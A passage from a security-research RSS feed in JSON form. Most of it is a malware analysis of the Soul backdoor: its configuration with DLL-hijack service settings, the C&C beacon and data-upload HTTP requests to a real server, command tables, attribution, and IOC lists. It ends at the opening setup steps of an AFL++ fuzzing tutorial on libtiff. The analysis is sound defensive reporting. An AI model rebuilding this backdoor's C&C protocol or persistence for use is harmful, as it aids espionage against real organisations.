&lt;SvcName>IKEEXT&lt;/SvcName>\n    &lt;SvcDisp>@%SystemRoot%\\system32\\ikeext.dll,-501&lt;/SvcDisp>\n    &lt;SvcDesc>@%SystemRoot%\\system32\\ikeext.dll,-502&lt;/SvcDesc>\n    &lt;SvcDll>wlbsctrl.dll&lt;/SvcDll>\n  &lt;/SVC>\n  &lt;ADV>\n    &lt;OlPass>NULL&lt;/OlPass>\n    &lt;OlTime>1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1;&lt;/OlTime>\n    &lt;SelfDestroy>2029-07-11 15:29:32&lt;/SelfDestroy>\n  &lt;/ADV>\n&lt;/CONFIG></pre>\n\n\n\n<p>In its base (<code>&lt;BASE&gt;</code>) settings, the configuration contains the parameter \u201c<code>LstPort</code>\u201d. In the previous versions, this provided the backdoor the ability to listen on a specified port. In this version, the code that supported this feature was removed, and the backdoor can only actively connect to the C&amp;C server using the URL provided in the \u201cIP\u201d parameter on the \u201cconnect\u201d port \u201c<code>Cnt</code>\u201d.</p>\n\n\n\n<p>In the \u201cadvanced\u201d section (<code>&lt;ADV&gt;</code>) of the configuration, the \u201c<code>OlTime</code>\u201d parameter contains a list of 168 (24&#215;7) numbers, one per hour in a week. Each hour is represented either by 0 or 1. Zero means a \u201cblocked\u201d hour, and one represents an \u201callowed\u201d hour. This way the operators of the malware can use the configuration to enforce the specific hours the backdoor is allowed to communicate with the C&amp;C server. If the&nbsp;<code>OlTime</code>&nbsp;field is empty in the config, a default setting is for all days and hours to be configured as \u201callowed\u201d. This is an advanced OpSec feature that allows the actors to blend their communication flow into general traffic and decrease the chances of network communication being detected. The \u201cservice\u201d (<code>&lt;SVC&gt;</code>) section defines the parameters for the backdoor to be installed as a service:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">  &lt;SVC>\n    &lt;SvcName>IKEEXT&lt;/SvcName>\n    &lt;SvcDisp>@%SystemRoot%\\system32\\ikeext.dll,-501&lt;/SvcDisp>\n    &lt;SvcDesc>@%SystemRoot%\\system32\\ikeext.dll,-502&lt;/SvcDesc>\n    &lt;SvcDll>wlbsctrl.dll&lt;/SvcDll>\n  &lt;/SVC></pre>\n\n\n\n<p>The Symantec publication also mentioned the Soul Searcher running as a service, but in the sample we analyzed, there is no code that implements this feature. Judging by the settings left in the configuration we observed, the actors performed some variation of&nbsp;<a href=\"https://infosecwriteups.com/ikeext-dll-hijacking-3aefe4dde7f5\">IKEEXT DLL Hijacking</a>, when on the start of the IKEEXT service,&nbsp;<code>svchost.exe</code>&nbsp;would load the malicious DLL, saved as&nbsp;<code>wlbsctrl.dll</code>.</p>\n\n\n\n<p>After loading and parsing the configuration the backdoor checks the registry&nbsp;<code>HKEY_CURRENT_USER\\SOFTWARE\\Software\\Microsoft\\CTF\\Assemblies</code>&nbsp;for the existence of a key with the name of MD5 hash of the wide string&nbsp;<code>L\"AutoRun\"</code>. If it exists, the backdoor decompresses, loads in memory, and executes the&nbsp;<code>Construct</code>&nbsp;export of the DLL stored in this key. Although we didn\u2019t witness the creation or usage of this additional DLL payload, this logic is likely used for auto-updates or executing specific actions prior to the main backdoor activity.</p>\n\n\n\n<p>After all of these steps are concluded, the backdoor begins the execution of its main thread.</p>\n\n\n\n<h3 class=\"wp-block-heading\">C&amp;C communication</h3>\n\n\n\n<p>The main thread begins by validating that it received from the configuration the C&amp;C URL and DNS (or blog URL, which is empty in our case), and that the C&amp;C URL starts with&nbsp;<code>http://</code>,&nbsp;<code>https://</code>&nbsp;or&nbsp;<code>ftp://</code>. In this specific sample, we did not observe any type of FTP communication capabilities. Then, if the current hour is \u201callowed\u201d by&nbsp;<code>OlTime</code>&nbsp;configuration, it begins the C&amp;C communication.</p>\n\n\n\n<p><strong>Bot registration and victim fingerprinting</strong></p>\n\n\n\n<p>The first request is sent to the specified URL with the&nbsp;<code>ClientHello</code>&nbsp;parameter. The MD5 header is an MD5 hash of the body. As there is no data transferred by this request, the MD5 (<code>d41d8cd98f00b204e9800998ecf8427e</code>) is of an empty string. In further analysis of the requests, we omit the common headers (Cache-Control, Connection, User-Agent, MD5 and Host) as their meaning doesn\u2019t change between the requests.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">GET /index.php?ClientHello HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nUser-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Win32)\nMD5: d41d8cd98f00b204e9800998ecf8427e\nContent-Length: 0\nHost: 103.159.132.96</pre>\n\n\n\n<p>The expected response from the C&amp;C server is&nbsp;<code>ERR! ParamError!</code>&nbsp;In case of a bad or no response, the backdoor attempts to resolve the IP address of the C&amp;C server on its own through the DNS servers in the config.</p>\n\n\n<div class=\"wp-block-image\">\n<figure class=\"aligncenter\"><img alt=\"Figure 3 - C&amp;C DNS resolution\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/NDB7HW48QG-image3.png\" /><figcaption class=\"wp-element-caption\">Figure 3 &#8211; C&amp;C DNS resolution</figcaption></figure></div>\n\n\n<p>If the response is correct, it saves the C&amp;C IP address in this format:&nbsp;<code>SVR:[IP_field_from_config]:[CntPort]</code> to the registry key&nbsp;<code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\SVIF</code>.</p>\n\n\n\n<p>Next, the module performs a full system enumeration and collects the following data:</p>\n\n\n\n<ul>\n<li>Processor name and the number of processors, total physical memory and total available physical memory, and information about the hard disk such as total space and free space.</li>\n\n\n\n<li>The OS architecture and various information from the&nbsp;<code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion</code>&nbsp;registry key such as ProductName, CSDVersion, ProductId, RegisteredOwner, RegisteredOrganization etc.</li>\n\n\n\n<li>Computer name and information about the current user, such as admin rights retrieved with&nbsp;<strong>NetUserGetInfo API.</strong></li>\n\n\n\n<li>Time zone information from both&nbsp;<code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation&nbsp;and&nbsp;HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Time Zones</code>&nbsp;registry.</li>\n\n\n\n<li>Local IP address of the machine, and its public IP address, obtained by issuing a request to one of the public IP resolution services such as&nbsp;<code>https://www.whatismyip.com/</code>:</li>\n</ul>\n\n\n<div class=\"wp-block-image center\">\n<figure class=\"aligncenter\"><img alt=\"Figure 4 - Victim machine enumeration data string\" src=\"https://research.checkpoint.com/wp-content/uploads/2023/03/NDB7HW48QG-image4.png\" /><figcaption class=\"wp-element-caption\">Figure 4 &#8211; Victim machine enumeration data string</figcaption></figure></div>\n\n\n<p>After the system enumeration, the backdoor generates a&nbsp;<code>botUUID</code>, concatenating with \u201c-\u201d two MD5 strings based on various parameters from the enumerated data. It saves the&nbsp;<code>botUUID</code>&nbsp;to the registry key&nbsp;<code>HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\UUID</code>. The resulting&nbsp;<code>botUUID</code>&nbsp;looks like this:</p>\n\n\n\n<p><code>5d41402abc4b2a76b9719d911017c592-7d793037a0760186574b0282f2f435e7</code></p>\n\n\n\n<p>and is used in all the following network requests.</p>\n\n\n\n<p><strong>New C&amp;C connection</strong></p>\n\n\n\n<p>After the system enumeration, the backdoor issues a series of requests to \u201cregister\u201d a new connection and perform validation against the C&amp;C server.</p>\n\n\n\n<p>First, the backdoor notifies the server of a new connection. It is implemented as a DELETE request with the botUUID:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">DELETE /index.php?[botUUID];[botUUID].txt HTTP/1.1</pre>\n\n\n\n<p>The accepted response from the C&amp;C:&nbsp;<code>OK!</code></p>\n\n\n\n<p>Next, the&nbsp;<code>Connect</code>&nbsp;request is sent, whose body contained Base64 of the string&nbsp;<code>ConnectXXXXXXXX</code>, where&nbsp;<code>XXXXXXXX</code>&nbsp;is the connection timestamp retrieved by&nbsp;<code>GetTickCount()</code>&nbsp;API.</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">POST /index.php?[botUUID]/REQ.dat HTTP/1.1\n\n[Base64-encoded string]</pre>\n\n\n\n<p>The accepted response from the C&amp;C:&nbsp;<code>OK!</code></p>\n\n\n\n<p>The following request prepares the server to receive the enumeration data from the victim\u2019s machine:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">GET /index.php?Enum;[botUUID]_[connection_timestamp].txt HTTP/1.1</pre>\n\n\n\n<p>The accepted response from the C&amp;C is a string that looks like this:&nbsp;<code>./Updata/[botUUID]_[connection_timestamp].txt</code>.</p>\n\n\n\n<p>This is most likely the path on the server to store the enumeration data.</p>\n\n\n\n<p>After this the backdoor sends another network request, possibly for verification:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">GET /index.php?D;[botUUID]_[connection_timestamp].txt HTTP/1.1</pre>\n\n\n\n<p>The accepted response is a base64-encoded string that contains the botUUID.</p>\n\n\n\n<p>At the end of this process, if all the requests are successful, the backdoor is \u201cregistered\u201d at the C&amp;C server and continues sending information about the system.</p>\n\n\n\n<p><strong>Send enumerated data</strong></p>\n\n\n\n<p>From this point on, the data sent between the backdoor and the C&amp;C server relies on another struct,&nbsp;<code>c2_body</code>:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">struct c2_body\n{\n  DWORD special_flag;\n  DWORD additional_data;\n  DWORD const_float;\n  BYTE command_id;\n};</pre>\n\n\n\n<p><code>const_float</code>, where used, is a hardcoded value, 5.2509999.&nbsp;<code>special_flag</code>&nbsp;and&nbsp;<code>additional_data</code>&nbsp;seem to be multipurpose variables that have different meanings in different contexts of the program execution. When sent in the body of both requests and responses, this struct is compressed according to the previously described&nbsp;<code>compressed_data</code>&nbsp;struct from SoulSearcher, and then encoded with Base64.</p>\n\n\n\n<p>First, the backdoor sends the current timestamp in the request to the following URL (a new timestamp is again retrieved by&nbsp;<code>GetTickCount()</code>&nbsp;API).</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">POST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1\n\n[base64-encoded and compressed c2_body]</pre>\n\n\n\n<p>In this request,&nbsp;<code>special_flag</code>&nbsp;is 0x00,&nbsp;<code>command_id</code>&nbsp;is 0x01 and&nbsp;<code>additonal_data</code>&nbsp;is the tick count. The accepted response is&nbsp;<code>OK!</code>&nbsp;Otherwise, the backdoor sleeps and starts the connection from the beginning.</p>\n\n\n\n<p>Next, the backdoor collects the enumeration data again, and compresses it using another struct:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">struct enum_compressed_data\n{\n  c2_body c2_msg;\n  compressed_data enum_data;\n};</pre>\n\n\n\n<p>The struct is then encoded with Base64 and sent in the body of the following request (the URL and methods are the same):</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">POST /index.php?CU;[botUUID]_[connection_timestamp].txt;[botUUID]/Data_S_[session_timestamp].dat HTTP/1.1\n[base64-encoded and compressed enum_compressed_data]</pre>\n\n\n\n<p>The&nbsp;<code>command_id</code>&nbsp;is the same 0x01,&nbsp;<code>special_flag</code>=0,&nbsp;<code>additional_data</code>= 0x4000 + 0x49 = size of enum data.</p>\n\n\n\n<p>The accepted response is also&nbsp;<code>OK!</code></p>\n\n\n\n<p><strong>Main C&amp;C loop</strong></p>\n\n\n\n<p>After posting the enumeration data, the backdoor enters an infinite loop, contacting the C&amp;C server with the following request to receive the commands:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">GET /index.php?CDD;[botUUID]_[connection_timestamp].txt;[botUUID]_[connection_timestamp]/Data_C_* HTTP/1.1</pre>\n\n\n\n<p>If there is no C&amp;C command for the victim, the server responds with&nbsp;<code>ERR! Path not found, WAIT!</code></p>\n\n\n\n<p>If there is a command to execute, the C&amp;C returns it in a base64-encoded string which is decompressed with&nbsp;<code>compressed_data</code>&nbsp;and parsed as&nbsp;<code>c2_body</code>. Then the&nbsp;<code>command_id</code>&nbsp;from the struct is translated to the actual command execution.</p>\n\n\n\n<h3 class=\"wp-block-heading\">Soul Backdoor Commands</h3>\n\n\n\n<p>The main commands that can be received from the C&amp;C server are control messages for the bot:</p>\n\n\n\n<figure class=\"wp-block-table\"><table><thead><tr><th>Command ID</th><th>Action</th><th>Description</th></tr></thead><tbody><tr><td>0x04</td><td>Execute command</td><td>Create a thread that handles commands from the second set of commands.</td></tr><tr><td>0x0D</td><td>Client keep-alive</td><td>Mirror the request from the C&amp;C server.</td></tr><tr><td>0x0E</td><td>Restart C&amp;C session</td><td>Send DELETE request and restart the communication from client Hello.</td></tr><tr><td>0x0F</td><td>Exit</td><td>Send DELETE request and exit process forcefully.</td></tr></tbody></table></figure>\n\n\n\n<p>If in the&nbsp;<code>c2_body</code>&nbsp;the&nbsp;<code>special_flag</code>&nbsp;is set to one, the backdoor starts a continuous loop requesting data from the C&amp;C server. The server should respond with a module name to be loaded from the&nbsp;<code>Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies</code>&nbsp;registry key, which is executed from its&nbsp;<code>Construct</code>&nbsp;export. Then the backdoor proceeds to execute the command specified in&nbsp;<code>command_id</code>.</p>\n\n\n\n<p>If the command_id is&nbsp;<code>0x04</code>, the backdoor spawns a new \u201ccommand execution\u201d thread that performs a similar network communication flow as the main thread, only without sending the enumeration data.</p>\n\n\n\n<p>It then begins handling the following commands:</p>\n\n\n\n<figure class=\"wp-block-table\"><table><thead><tr><th>Command ID</th><th>Action</th><th>Description</th></tr></thead><tbody><tr><td>0xF</td><td>Exit thread</td><td>If the&nbsp;<code>command_flag</code>&nbsp;is on stop, exit the \u201ccommand execution\u201d thread. Otherwise do nothing</td></tr><tr><td>0x61</td><td>Install modules</td><td>The server sends the number of modules to be written to the registry. Then the bot makes requests to the C&amp;C server, once per module and writes it to a specified registry key. Validate the result by executing command&nbsp;<code>0x65</code>&nbsp;afterward.<br />All the registry keys are under&nbsp;<code>Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies</code>.</td></tr><tr><td>0x62</td><td>Delete modules</td><td>Delete registry keys that are sent by the C&amp;C in a string separated by semi-colons (;). Validate the result by executing command&nbsp;<code>0x65</code>&nbsp;afterward.</td></tr><tr><td>0x63</td><td>Validate modules</td><td>Validate that modules are currently compatible with the system architecture. The modules are located in the registry, and registry keys names are sent by the C&amp;C separated by a semi-colon.</td></tr><tr><td>0x64</td><td>Load module</td><td>Load the specified module and call its export function&nbsp;<code>Construct</code>. The registry key where the module is stored is sent by the C&amp;C server.</td></tr><tr><td>0x65</td><td>Enumerate modules</td><td>Create a buffer with all registry keys under&nbsp;<code>Computer\\HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\CTF\\Assemblies</code>&nbsp;in the format of&nbsp;<code>%s:%f:;</code>&nbsp;(key name and first 4 bytes of the value), then send the buffer back to the C&amp;C.</td></tr></tbody></table></figure>\n\n\n\n<p>All the received modules are stored compressed in the registry. The decompression is performed according to another struct:</p>\n\n\n\n<pre class=\"EnlighterJSRAW\">struct stored_module\n{\n  float version_or_id;\n  QWORD decompressed_size;\n  QWORD compressed_size;\n  BYTE md5sum[33];\n  BYTE compressed_data[];\n};</pre>\n\n\n\n<p>We didn\u2019t witness any follow-up modules, but due to the modular nature of the backdoor, we can expect the actors to use all kinds of data-stealing modules, keyloggers, data exfiltration modules and likely also a lateral movement toolset.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Attribution</h2>\n\n\n\n<p>As the first stages of the infection chain are identical to the previously described Sharp Panda activity, many of the indicators that allowed us to attribute the threat actors to Chinese-based threat groups are still relevant in relation to the subsequent attack attempts described in this report:</p>\n\n\n\n<ul>\n<li>The&nbsp;RoyalRoad&nbsp;RTF kit was reported as the tool of choice among Chinese APT groups and is still used despite the exploitation of old patched vulnerabilities. This implies that at least a portion of the attacks using it are successful, and the threat actors are familiar with the cybersecurity practices of their targets.</li>\n\n\n\n<li>Over the past several years, the C&amp;C servers consistently return payloads only between 01:00 \u2013 08:00 UTC Monday-Friday, which we believe represents the actors\u2019 working hours.</li>\n\n\n\n<li>The C&amp;C servers did not return payloads during the period of the&nbsp;<a href=\"https://publicholidays.cn/2023-dates/\">Chinese Spring Festival</a>, even during working hours.</li>\n\n\n\n<li>The victimology of the attacks is consistent with Chinese interests in Southeast Asian countries, particularly those with similar territorial claims or strategic infrastructure projects.</li>\n</ul>\n\n\n\n<p>In addition, the Soul Backdoor configuration contains 2 hardcoded DNS services, one of which is a Chinese&nbsp;<a href=\"https://www.114dns.com/index.html\">114DNS</a>&nbsp;Free Public DNS service which is not commonly used outside the region.</p>\n\n\n\n<p>The campaign discussed in this report involves the malicious artifacts from different clusters of malware activity. As sharing custom tools or operational methods is common among Chinese-based threat actors to facilitate intrusion efforts, it poses a challenge to their attribution. In addition to observing different toolsets from two previously not connected clusters (Sharp Panda and previous attacks using the Soul framework), other areas of overlap between publicly tracked Chinese APT groups and this campaign include the following:</p>\n\n\n\n<ul>\n<li>Infrastructure: One of the IP addresses used by Sharp Panda\u2019s initial infection in late 2021 overlaps with the IP reportedly used by TAG-16 in the same timeframe. In the relevant&nbsp;<a href=\"https://go.recordedfuture.com/hubfs/reports/cta-2021-1208.pdf\">report</a>, the Insikt Group researchers provided evidence suggesting that TAG-16 shares custom capabilities with the People\u2019s Liberation Army (PLA)-linked activity group RedFoxtrot.</li>\n\n\n\n<li>The Southeast Asian government entity attacked in the described campaign was also targeted by a tool&nbsp;<a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/cicada-apt10-china-ngo-government-attacks\">attributed</a>&nbsp;to a Chinese-linked APT group during the same time period. However, there is currently no clear evidence to tie the tool to this campaign with high confidence.</li>\n\n\n\n<li>Symantec researchers also&nbsp;<a href=\"https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/espionage-campaign-south-east-asia\">discovered</a>&nbsp;the APT30 toolset in the network of one of the organizations attacked with the Soul framework in the same timeframe, with no distinctive connection as well.</li>\n</ul>\n\n\n\n<p>The vague links of all the aforementioned groups to Chinese intelligence Services, the nature of the targets, and the capabilities of the toolset used lead us to the conclusion that the described activity is an espionage operation likely executed by well-resourced and possibly nation-state threat actors.</p>\n\n\n\n<h2 class=\"wp-block-heading\">Conclusion</h2>\n\n\n\n<p>In this report, we analyzed the TTPs and the tools used in the espionage campaign against Southeast Asian government entities. The initial infection stages of this campaign use TTPs and tools consistent with Sharp Panda activity first discovered in 2021. We continue to track Sharp Panda as a separate unknown cluster, and based on our current insight into this threat, we cannot confirm with high confidence their relation to other Chinese threat actors.</p>\n\n\n\n<p>The later stages of the infection chain in the described campaign are based on Soul, a previously unattributed modular malware framework. While the Soul framework has been in use since at least 2017, the threat actors behind it have been constantly updating and refining its architecture and capabilities. Based on the technical findings presented in our research, we believe this campaign is staged by advanced Chinese-backed threat actors, whose other tools, capabilities, and position within the broader network of espionage activities are yet to be explored.</p>\n\n\n\n<h2 class=\"wp-block-heading\">IOCs</h2>\n\n\n\n<h3 class=\"wp-block-heading\">C&amp;C servers</h3>\n\n\n\n<ul>\n<li>45.76.190[.]210</li>\n\n\n\n<li>45.197.132[.]68</li>\n\n\n\n<li>45.197.133[.]23</li>\n\n\n\n<li>103.78.242[.]11</li>\n\n\n\n<li>103.159.132[.]96</li>\n\n\n\n<li>103.173.154[.]168</li>\n\n\n\n<li>103.213.247[.]48</li>\n\n\n\n<li>139.180.137[.]73</li>\n\n\n\n<li>139.180.138[.]49</li>\n\n\n\n<li>152.32.243[.]17</li>\n\n\n\n<li>office.oiqezet[.]com</li>\n</ul>\n\n\n\n<h3 class=\"wp-block-heading\">Hashes</h3>\n\n\n\n<p><strong>Phishing documents</strong></p>\n\n\n\n<ul>\n<li>32a0f6276fea9fe5ee2ffda461494a24a5b1f163a300bc8edd3b33c9c6cc2d17</li>\n\n\n\n<li>ca7f297dc04acad2fab04d5dc2de9475aed4186805f6c237c10b8f56b384cf30</li>\n\n\n\n<li>341dee709285286bc5ba94d14d1bce8a6416cb93a054bd183b501552a17ef314</li>\n\n\n\n<li>9d628750295f5cde72f16da02c430b5476f6f47360d008911891fdb5b14a1a01</li>\n\n\n\n<li>811a020b0f0bb31494f7fbe21893594cd44d90f77fcd1f257925c4ac5fabed43</li>\n\n\n\n<li>b023e2b398d552aacb2233a6e08b4734c205ab6abf5382ec31e6d5aa7c71c1cb</li>\n</ul>\n\n\n\n<p><strong>External template (RoyalRoad RTF)</strong></p>\n\n\n\n<ul>\n<li>81d9e75d279a953789cbbe9ae62ce0ed625b61d123fef8ffe49323a04fecdb3f</li>\n\n\n\n<li>12c1a4c6406ff378e8673a20784c21fb997180cd333f4ef96ed4873530baa8d3</li>\n\n\n\n<li>f2779c63373e33fdbd001f336df36b01b0360cd6787c1cd29a6524cc7bcf1ffb</li>\n\n\n\n<li>7a7e519f82af8091b9ddd14e765357e8900522d422606aefda949270b9bf1a04</li>\n\n\n\n<li>4747e6a62fee668593ceebf62f441032f7999e00a0dfd758ea5105c1feb72225</li>\n\n\n\n<li>3541f3d15698711d022541fb222a157196b5c21be4f01c5645c6a161813e85eb</li>\n</ul>\n\n\n\n<p><strong>5.t Downloader</strong></p>\n\n\n\n<ul>\n<li>0f9f85d41da21781933e33dddcc5f516c5ec07cc5b4cff53ba388467bc6ac3fd</li>\n\n\n\n<li>17f4a21e0e8c0ce958baf34e45a8b9481819b9b739f3e48c6ba9a6633cf85b0e</li>\n\n\n\n<li>f8622a502209c18055a308022629432d82f823dd449abd9b17c61e363a890828</li>\n\n\n\n<li>1a15a35065ec7c2217ca6a4354877e6a1de610861311174984232ba5ff749114</li>\n\n\n\n<li>065d399f6e84560e9c82831f9f2a2a43a7d853a27e922cc81d3bc5fcd1adfc56</li>\n\n\n\n<li>1e18314390302cd7181b710a03a456de821ad85334acfb55f535d311dd6b3d65</li>\n\n\n\n<li>c4500ad141c595d83f8dba52fa7a1456959fb0bc2ee6b0d0f687336f51e1c14e</li>\n\n\n\n<li>390e6820b2cc173cfd07bcebd67197c595f4705cda7489f4bc44c933ddcf8de6</li>\n</ul>\n\n\n\n<p><strong>SoulSearcher</strong></p>\n\n\n\n<ul>\n<li>d1a6c383de655f96e53812ee1dec87dd51992c4be28471e44d7dd558585312e0</li>\n</ul>\n\n\n\n<p><strong>Soul Backdoor</strong></p>\n\n\n\n<ul>\n<li>df5fe7ec6ecca27d3affc901cb06b27dc63de9ea8c97b87bc899a79eca951d60</li>\n</ul>\n\n\n<p>The post <a href=\"https://research.checkpoint.com/2023/pandas-with-a-soul-chinese-espionage-attacks-against-southeast-asian-government-entities/\" rel=\"nofollow\">Pandas with a Soul: Chinese Espionage Attacks Against Southeast Asian Government Entities</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
                }
            ]
        },
        {
            "title": "The Blitz Tutorial Lab on Fuzzing with AFL++",
            "title_detail": {
                "type": "text/plain",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "The Blitz Tutorial Lab on Fuzzing with AFL++"
            },
            "links": [
                {
                    "rel": "alternate",
                    "type": "text/html",
                    "href": "https://research.checkpoint.com/2023/the-blitz-tutorial-lab-on-fuzzing-with-afl/"
                }
            ],
            "link": "https://research.checkpoint.com/2023/the-blitz-tutorial-lab-on-fuzzing-with-afl/",
            "authors": [
                {
                    "email": "elism@checkpoint.com"
                }
            ],
            "author": "elism@checkpoint.com",
            "author_detail": {
                "email": "elism@checkpoint.com"
            },
            "published": "Mon, 06 Mar 2023 15:13:13 +0000",
            "published_parsed": [
                2023,
                3,
                6,
                15,
                13,
                13,
                0,
                65,
                0
            ],
            "tags": [
                {
                    "term": "Check Point Research Publications",
                    "scheme": null,
                    "label": null
                }
            ],
            "id": "https://research.checkpoint.com/?p=27521",
            "guidislink": false,
            "summary": "<p>Introduction To paraphrase a famous quote by Pete Cordell, telling an infosec enthusiast there&#8217;s already a tutorial on how to do X is like telling a songwriter there&#8217;s already a song about love. This specific tutorial is borne out of sympathy for readers who know their way around C language, GNU make and the like, [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/the-blitz-tutorial-lab-on-fuzzing-with-afl/\" rel=\"nofollow\">The Blitz Tutorial Lab on Fuzzing with AFL++</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>",
            "summary_detail": {
                "type": "text/html",
                "language": null,
                "base": "https://research.checkpoint.com/feed/",
                "value": "<p>Introduction To paraphrase a famous quote by Pete Cordell, telling an infosec enthusiast there&#8217;s already a tutorial on how to do X is like telling a songwriter there&#8217;s already a song about love. This specific tutorial is borne out of sympathy for readers who know their way around C language, GNU make and the like, [&#8230;]</p>\n<p>The post <a href=\"https://research.checkpoint.com/2023/the-blitz-tutorial-lab-on-fuzzing-with-afl/\" rel=\"nofollow\">The Blitz Tutorial Lab on Fuzzing with AFL++</a> appeared first on <a href=\"https://research.checkpoint.com\" rel=\"nofollow\">Check Point Research</a>.</p>"
            },
            "content": [
                {
                    "type": "text/html",
                    "language": null,
                    "base": "https://research.checkpoint.com/feed/",
                    "value": "<h1 class=\"wp-block-heading\">Introduction</h1>\n\n\n\n<p>To paraphrase a famous quote by Pete Cordell, telling an infosec enthusiast there&#8217;s already a tutorial on how to do X is like telling a songwriter there&#8217;s already a song about love. This specific tutorial is borne out of sympathy for readers who know their way around C language, GNU <code>make</code> and the like, but upon seeing the word &#8220;fuzzing&#8221; have muttered to themselves some variation on &#8220;meh, that sounds complicated&#8221;. The guiding principle in this tutorial is minimalism in the requirements: carrying the reader to &#8220;hey I fuzzed a program and found a bug&#8221; with the least possible amount of work.</p>\n\n\n\n<p>To this end, the tutorial uses a lab format we&#8217;ve encountered a few times &#8216;in the wild&#8217; and found to be very effective &#8212; a series of exercises where every possible bit of boilerplate has already been filled in, and the reader must only complete the load-bearing logic; and, in the event the correct solution still proves elusive, a complete solution is available that can be compiled, run and seen to achieve the desired effect. The reader can thus freely choose to what degree they want to engage with the material, on the spectrum between &#8220;not at all&#8221; and &#8220;excessively&#8221;. By this we mean it is possible to complete this lab by repeatedly copying, pasting and hitting return; and, conversely, it is possible to take a deep dive and understand each solution enough to write it from scratch or tinker with it.</p>\n\n\n\n<p>As a fuzzing target this lab uses an old version of <code>libtiff</code>, a library for reading and writing TIFF format files. TIFF is a format for storing raster graphics images, popular among graphic artists, the publishing industry, and photographers.</p>\n\n\n\n<p>A git repository of the exercise files is available <a href=\"https://github.com/BenH11235/libtiff-fuzzing-lab\">here</a>. If your instinctive response to that is &#8220;ugh&#8221; then do not fret, every time you need a file for one of the exercises, a direct link will be provided for you to download the file. Of course, if your instinctive response is &#8220;yeah yeah &#8216;git clone&#8217; I know the drill&#8221; then you know what to do.</p>\n\n\n\n<p>You will need a Linux machine &#8212; the commands listed assume Ubuntu; if you are using something else, adjust accordingly. You will also want to keep on-hand the <a href=\"http://www.libtiff.org/libtiff.html#FIO\">libtiff documentation for basic file handling</a>.</p>\n\n\n\n<h1 class=\"wp-block-heading\">Exercise 0 \u2014 Dry Run</h1>\n\n\n\n<p>We will now participate in the time-honored tradition of the sanity check, the importance of which we really cannot overstate. No one likes to spend an hour isolating the exact cause the fridge won&#8217;t turn on in the midst of a power outage &#8212; but somehow it seems every developer has at one time been reduced to essentially doing this (e.g. adding 7 increasingly banal <code>printf</code>s to some code before finally realizing they were editing the wrong file). If and when we run into an issue later, we want to make sure that the issue is in fact the actual material, and not something down the stack that prevents us from even properly compiling and running a program that makes simple use of libtiff in the first place.</p>\n\n\n\n<p>First, we must obtain a copy of the obsolete version 4.0.6 of libtiff. Perform the following steps:</p>\n\n\n\n<ul>\n<li><code>cd /usr/src</code></li>\n\n\n\n<li>Download a libtiff release: <code>sudo wget https://github.com/vadz/libtiff/archive/Release-v4-0-6.zip</code></li>\n\n\n\n<li>Unzip the zipped repo: <code>sudo unzip Release-v4-0-6.zip</code></li>\n\n\n\n<li>Give your normal user permissions for this directory: <code>sudo chown -R &lt;your_user_here&gt; libtiff-Release-v4-0-6</code></li>\n\n\n\n<li>Enter the unzipped directory: <code>cd libtiff-Release-v4-0-6/</code></li>\n\n\n\n<li>Compile the project from source, using a 32-bit target\n<ul>\n<li><code>./configure i686-pc-linux-gnu CFLAGS='-m32 -g' CXXFLAGS='-m32 -g'</code></li>\n\n\n\n<li><code>make clean</code> (in case you have leftover object files from previous build)</li>\n\n\n\n<li><code>make</code></li>\n</ul>\n</li>\n</ul>\n\n\n\n<p>You also want to execute the command <code>mv ./libtiff/mkg3states.o ./libtiff/mkg3states.o.bkp</code>. This wart is due to the file <code>mkg3states.o</code> having a <code>main</code> function; we want to create our own program that will have its own <code>main</code> function, and so getting the file out of the way is necessary to prevent a conflict during the compilation process.</p>\n\n\n\n<p>Unless you&#8217;ve seen it before, the below is your first introduction to the boilerplate-included exercise format we&#8217;ve mentioned in the introduction. Below you are given two files: <code>loadtiff.c</code> and <code>Makefile</code>, and you are required to fill in the blanks, which are numbered <code>#1</code>, <code>#2</code> and so on. It so happens that in this specific exercise there are no blanks to be filled for <code>Makefile</code> &#8212; it can be used as-is.</p>\n\n\n\n<h2 